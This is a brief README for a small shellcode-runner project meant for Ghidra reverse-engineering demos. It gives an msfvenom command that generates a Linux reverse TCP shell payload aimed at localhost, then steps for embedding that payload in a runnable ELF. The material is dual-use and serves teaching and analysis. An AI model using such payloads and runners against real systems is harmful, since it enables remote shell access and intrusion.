# Simple_ELF_Shellcode_Runner
Just a simple ELF shellcode runner to use for Ghidra demos.


## How to build
0. Generate a payload with ```msfvenom``` or shellcode generator of your choice.
```
msfvenom -p linux/x86/shell/reverse_tcp LPORT=4444 LHOST=127.0.0.1 -f c
```
1. Update the payload and sczsize variables.

2. Build the payload via ```make```
